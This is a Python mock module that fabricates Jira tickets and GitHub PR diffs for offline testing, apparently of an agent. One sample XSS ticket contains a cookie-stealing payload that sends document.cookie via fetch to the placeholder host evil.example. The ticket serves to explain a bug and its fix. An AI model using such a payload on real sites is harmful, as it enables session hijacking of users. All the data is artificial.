"""
Pseudo Setup — Mock Jira & GitHub
===================================
Simulates Jira tickets and GitHub Pull Requests without any real credentials.
Deterministic output based on the hash of the id/repo so repeated calls are stable.

Usage:
    from pseudo_setup import PseudoJira, PseudoGitHub

    jira = PseudoJira()
    ticket = jira.format_ticket_for_agent("DEMO-42")

    gh = PseudoGitHub()
    pr_data = gh.fetch_pr_data("my-org/my-app", pr_number=7)
"""

import hashlib
import textwrap
from datetime import datetime, timedelta

# ─────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────

def _pick(items: list, seed: str):
    """Deterministically pick an item from a list using a string seed."""
    idx = int(hashlib.md5(seed.encode()).hexdigest(), 16) % len(items)
    return items[idx]


# ─────────────────────────────────────────────────────────────────
# Pseudo Jira
# ─────────────────────────────────────────────────────────────────

class PseudoJira:
    """Generate realistic mock Jira tickets without credentials."""

    TICKETS = [
        {
            "summary": "Fix memory leak in session manager",
            "description": textwrap.dedent("""\
                ## Problem
                Long-running user sessions cause memory usage to climb steadily.
                After 2-3 hours of use, the application becomes unresponsive.

                ## Steps to Reproduce
                1. Log in and stay active for 2+ hours
                2. Monitor memory usage via Task Manager
                3. Observe continuous growth without GC recovery

                ## Expected
                Memory should stabilize after initial load.

                ## Actual
                Memory grows ~5 MB per minute, never released.

                ## Environment
                - OS: Ubuntu 22.04
                - App version: 3.4.1
                - Runtime: Node.js 18.12.0
            """).strip(),
            "status": "In Progress",
            "priority": "High",
            "issue_type": "Bug",
            "assignee": "alice@company.com",
            "reporter": "bob@company.com",
            "labels": ["performance", "memory", "session", "backend"],
            "components": ["Session Management"],
        },
        {
            "summary": "Add OAuth2 PKCE flow to mobile login",
            "description": textwrap.dedent("""\
                ## Goal
                Replace the legacy authorization_code flow with PKCE so the mobile
                client no longer needs a client secret embedded in the binary.

                ## Acceptance Criteria
                - [ ] Implement code_verifier / code_challenge generation (S256)
                - [ ] Update /auth/callback to validate the challenge
                - [ ] Remove client_secret from mobile build config
                - [ ] Add integration tests

                ## References
                - RFC 7636
                - Existing auth module: src/auth/oauth.py
            """).strip(),
            "status": "To Do",
            "priority": "Medium",
            "issue_type": "Story",
            "assignee": "carol@company.com",
            "reporter": "pm@company.com",
            "labels": ["security", "oauth", "mobile", "auth"],
            "components": ["Authentication", "Mobile API"],
        },
        {
            "summary": "Database query timeout on large dashboard loads",
            "description": textwrap.dedent("""\
                ## Problem
                The /api/v2/dashboard endpoint times out (> 30 s) for organisations
                with more than 10,000 records.

                ## Root Cause (suspected)
                The `get_all_metrics()` call fetches every row and then filters
                in Python instead of using a WHERE clause.

                ## Impact
                - 15% of enterprise customers affected
                - SLA breach risk (99.9% uptime commitment)

                ## Suggested Fix
                Push filtering into SQL, add composite index on (org_id, created_at).
            """).strip(),
            "status": "In Progress",
            "priority": "Critical",
            "issue_type": "Bug",
            "assignee": "dave@company.com",
            "reporter": "support@company.com",
            "labels": ["database", "performance", "api", "enterprise"],
            "components": ["Dashboard", "Data Layer"],
        },
        {
            "summary": "Migrate CI pipeline from CircleCI to GitHub Actions",
            "description": textwrap.dedent("""\
                ## Objective
                Cut CI costs and reduce context-switching by consolidating all
                automation inside GitHub.

                ## Tasks
                - [ ] Port unit-test job
                - [ ] Port Docker build + push job
                - [ ] Port deployment job (staging → production)
                - [ ] Secret migration in GitHub org settings
                - [ ] Remove CircleCI config after 2-week parallel run

                ## Non-goals
                - Changing test framework
                - Changing Dockerfile
            """).strip(),
            "status": "To Do",
            "priority": "Low",
            "issue_type": "Task",
            "assignee": "eve@company.com",
            "reporter": "cto@company.com",
            "labels": ["devops", "ci-cd", "github-actions"],
            "components": ["Infrastructure"],
        },
        {
            "summary": "XSS vulnerability in user profile bio field",
            "description": textwrap.dedent("""\
                ## Severity: HIGH (CVSS 7.4)

                ## Description
                The profile bio is rendered with `innerHTML` without sanitisation.
                An attacker can inject a script tag that runs in the victim's session.

                ## PoC
                ```
                <img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
                ```

                ## Fix
                1. Use `textContent` instead of `innerHTML` everywhere bio is rendered
                2. Add DOMPurify sanitisation server-side before storage
                3. Apply Content-Security-Policy header: `script-src 'self'`
            """).strip(),
            "status": "In Progress",
            "priority": "Critical",
            "issue_type": "Bug",
            "assignee": "security@company.com",
            "reporter": "security@company.com",
            "labels": ["security", "xss", "frontend", "urgent"],
            "components": ["User Profiles", "Frontend"],
        },
    ]

    def fetch_ticket(self, ticket_id: str) -> dict:
        data = dict(_pick(self.TICKETS, ticket_id))
        data["key"] = ticket_id.upper()
        base_date = datetime(2025, 1, 1) + timedelta(
            days=int(hashlib.md5(ticket_id.encode()).hexdigest()[:4], 16) % 365
        )
        data["created"] = base_date.strftime("%Y-%m-%dT%H:%M:%S.000+0000")
        data["updated"] = (base_date + timedelta(days=3)).strftime("%Y-%m-%dT%H:%M:%S.000+0000")
        return data

    def format_ticket_for_agent(self, ticket_id: str) -> str:
        t = self.fetch_ticket(ticket_id)
        return (
            f"[PSEUDO JIRA TICKET — {t['key']}]\n"
            f"Summary   : {t['summary']}\n"
            f"Type      : {t['issue_type']}\n"
            f"Status    : {t['status']}\n"
            f"Priority  : {t['priority']}\n"
            f"Assignee  : {t['assignee']}\n"
            f"Labels    : {', '.join(t['labels'])}\n"
            f"Components: {', '.join(t['components'])}\n\n"
            f"Description:\n{t['description']}"
        )


# ─────────────────────────────────────────────────────────────────
# Pseudo GitHub
# ─────────────────────────────────────────────────────────────────

_PYTHON_DIFF = textwrap.dedent("""\
    diff --git a/src/session/manager.py b/src/session/manager.py
    index 4b3f8a2..9d1c0e7 100644
    --- a/src/session/manager.py
    +++ b/src/session/manager.py
    @@ -42,10 +42,15 @@ class SessionManager:
         def _cleanup_expired(self):
    -        for sid, session in self._store.items():
    -            if session.is_expired():
    -                del self._store[sid]
    +        expired_keys = [
    +            sid for sid, session in self._store.items()
    +            if session.is_expired()
    +        ]
    +        for sid in expired_keys:
    +            del self._store[sid]
    +            self._metrics.increment('session.expired')
    +        if expired_keys:
    +            logger.info("Purged %d expired sessions", len(expired_keys))

    @@ -60,6 +65,8 @@ class SessionManager:
         def create(self, user_id: str) -> str:
             sid = secrets.token_hex(32)
    -        self._store[sid] = Session(user_id)
    +        session = Session(user_id, ttl=self._config.session_ttl)
    +        self._store[sid] = session
    +        self._metrics.increment('session.created')
             return sid
""")

_JS_DIFF = textwrap.dedent("""\
    diff --git a/frontend/src/components/UserProfile.jsx b/frontend/src/components/UserProfile.jsx
    index 1a2b3c4..5d6e7f8 100644
    --- a/frontend/src/components/UserProfile.jsx
    +++ b/frontend/src/components/UserProfile.jsx
    @@ -18,7 +18,8 @@ export function UserProfile({ user }) {
       return (
         <div className="profile">
           <h2>{user.name}</h2>
    -      <div dangerouslySetInnerHTML={{ __html: user.bio }} />
    +      <div className="bio">{DOMPurify.sanitize(user.bio)}</div>
    +      {/* XSS fix: use DOMPurify, never dangerouslySetInnerHTML for user content */}
         </div>
       );
     }

    diff --git a/frontend/src/utils/sanitize.js b/frontend/src/utils/sanitize.js
    new file mode 100644
    --- /dev/null
    +++ b/frontend/src/utils/sanitize.js
    @@ -0,0 +1,12 @@
    +import DOMPurify from 'dompurify';
    +
    +/** Sanitise any HTML string before rendering to the DOM. */
    +export function safeHtml(dirty) {
    +  return DOMPurify.sanitize(dirty, {
    +    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'br'],
    +    ALLOWED_ATTR: ['href', 'rel'],
    +  });
    +}
""")

_SQL_DIFF = textwrap.dedent("""\
    diff --git a/db/migrations/0042_add_dashboard_index.sql b/db/migrations/0042_add_dashboard_index.sql
    new file mode 100644
    --- /dev/null
    +++ b/db/migrations/0042_add_dashboard_index.sql
    @@ -0,0 +1,10 @@
    +-- Migration: add composite index for dashboard queries
    +-- Fixes slow dashboard load for large organisations (PROJ-103)
    +
    +CREATE INDEX CONCURRENTLY IF NOT EXISTS
    +  idx_metrics_org_created
    +ON metrics(org_id, created_at DESC);
    +
    +-- Update query in get_all_metrics to use WHERE clause
    +COMMENT ON INDEX idx_metrics_org_created IS
    +  'Supports /api/v2/dashboard filtered queries';

    diff --git a/src/data/metrics.py b/src/data/metrics.py
    index aabbcc1..ddeeff2 100644
    --- a/src/data/metrics.py
    +++ b/src/data/metrics.py
    @@ -31,7 +31,8 @@ class MetricsRepository:
    -    def get_all_metrics(self, org_id: str) -> list:
    -        rows = self.db.execute("SELECT * FROM metrics").fetchall()
    -        return [r for r in rows if r['org_id'] == org_id]
    +    def get_all_metrics(self, org_id: str, limit: int = 1000) -> list:
    +        return self.db.execute(
    +            "SELECT * FROM metrics WHERE org_id = ? ORDER BY created_at DESC LIMIT ?",
    +            (org_id, limit)
    +        ).fetchall()
""")

_GO_DIFF = textwrap.dedent("""\
    diff --git a/internal/auth/pkce.go b/internal/auth/pkce.go
    new file mode 100644
    --- /dev/null
    +++ b/internal/auth/pkce.go
    @@ -0,0 +1,42 @@
    +package auth
    +
    +import (
    +    "crypto/rand"
    +    "crypto/sha256"
    +    "encoding/base64"
    +    "fmt"
    +)
    +
    +// PKCEPair holds the verifier and its challenge for an OAuth2 PKCE flow.
    +type PKCEPair struct {
    +    Verifier  string
    +    Challenge string
    +}
    +
    +// NewPKCEPair generates a new S256 code_verifier and code_challenge pair.
    +func NewPKCEPair() (*PKCEPair, error) {
    +    b := make([]byte, 32)
    +    if _, err := rand.Read(b); err != nil {
    +        return nil, fmt.Errorf("pkce: rand read: %w", err)
    +    }
    +    verifier := base64.RawURLEncoding.EncodeToString(b)
    +    sum := sha256.Sum256([]byte(verifier))
    +    challenge := base64.RawURLEncoding.EncodeToString(sum[:])
    +    return &PKCEPair{Verifier: verifier, Challenge: challenge}, nil
    +}
""")

_YAML_DIFF = textwrap.dedent("""\
    diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
    new file mode 100644
    --- /dev/null
    +++ b/.github/workflows/ci.yml
    @@ -0,0 +1,45 @@
    +name: CI
    +on:
    +  push:
    +    branches: [main, develop]
    +  pull_request:
    +
    +jobs:
    +  test:
    +    runs-on: ubuntu-latest
    +    steps:
    +      - uses: actions/checkout@v4
    +      - uses: actions/setup-python@v5
    +        with: { python-version: '3.12' }
    +      - run: pip install -r requirements.txt
    +      - run: pytest --tb=short -q
    +
    +  docker-build:
    +    needs: test
    +    runs-on: ubuntu-latest
    +    steps:
    +      - uses: actions/checkout@v4
    +      - uses: docker/build-push-action@v5
    +        with:
    +          push: ${{ github.ref == 'refs/heads/main' }}
    +          tags: ghcr.io/${{ github.repository }}:latest
""")


class PseudoGitHub:
    """Generate realistic mock GitHub PR / Issue data without credentials."""

    DIFFS = [_PYTHON_DIFF, _JS_DIFF, _SQL_DIFF, _GO_DIFF, _YAML_DIFF]

    PR_TITLES = [
        "fix: resolve memory leak in session cleanup loop",
        "security: replace dangerouslySetInnerHTML with DOMPurify sanitisation",
        "perf: push dashboard filtering into SQL, add composite index",
        "feat: implement PKCE S256 flow for mobile OAuth2",
        "chore: migrate CI pipeline from CircleCI to GitHub Actions",
    ]

    PR_BODIES = [
        "Fixes the session store mutation-during-iteration bug. Adds metrics counters.",
        "Resolves XSS vector in user profile bio. All user-supplied HTML is now sanitised before render.",
        "Resolves dashboard timeout for large orgs. Query time drops from >30s to <200ms.",
        "Implements RFC 7636 PKCE S256. Client secret removed from mobile binary.",
        "Ports all CircleCI jobs to GitHub Actions. Parallel run for two weeks then remove old config.",
    ]

    ISSUE_TITLES = [
        "Memory leak makes app unresponsive after 2 hours",
        "XSS in profile bio allows cookie theft",
        "Dashboard times out for organisations with >10k records",
        "Mobile OAuth: client_secret must not be embedded in binary",
        "CircleCI costs exceed budget — migrate to GitHub Actions",
    ]

    def fetch_pr_data(self, repo: str, pr_number: int) -> dict:
        seed = f"{repo}#{pr_number}"
        idx = int(hashlib.md5(seed.encode()).hexdigest(), 16) % len(self.PR_TITLES)
        diff = self.DIFFS[idx]

        # Build fake file list from diff headers
        changed_files = []
        for line in diff.splitlines():
            if line.startswith("diff --git"):
                parts = line.split(" ")
                fname = parts[-1].lstrip("b/")
                status = "added" if "new file" in diff else "modified"
                changed_files.append({"path": fname, "status": status})

        before_lines, after_lines = [], []
        for line in diff.splitlines():
            if line.startswith("-") and not line.startswith("---"):
                before_lines.append(line[1:])
            elif line.startswith("+") and not line.startswith("+++"):
                after_lines.append(line[1:])

        return {
            "what_changed": f"[PSEUDO GitHub PR #{pr_number}] {self.PR_TITLES[idx]} in {repo}",
            "ticket": (
                f"[PSEUDO GitHub PR #{pr_number} — {repo}]\n"
                f"Title : {self.PR_TITLES[idx]}\n"
                f"Body  : {self.PR_BODIES[idx]}\n"
                f"State : open\n"
                f"Files : {len(changed_files)} changed"
            ),
            "code_before": "\n".join(before_lines) or "(new files only)",
            "code_after": "\n".join(after_lines) or "(new files only)",
            "repo_structure": "\n".join(f["path"] for f in changed_files),
            "logs": "(pseudo mode — no runtime logs)",
            "changed_files": changed_files,
            "full_diff": diff,
        }

    def fetch_issue(self, repo: str, issue_number: int) -> dict:
        seed = f"{repo}!{issue_number}"
        idx = int(hashlib.md5(seed.encode()).hexdigest(), 16) % len(self.ISSUE_TITLES)
        return {
            "title": self.ISSUE_TITLES[idx],
            "body": self.PR_BODIES[idx],
            "state": "open",
            "labels": ["pseudo", "demo"],
        }
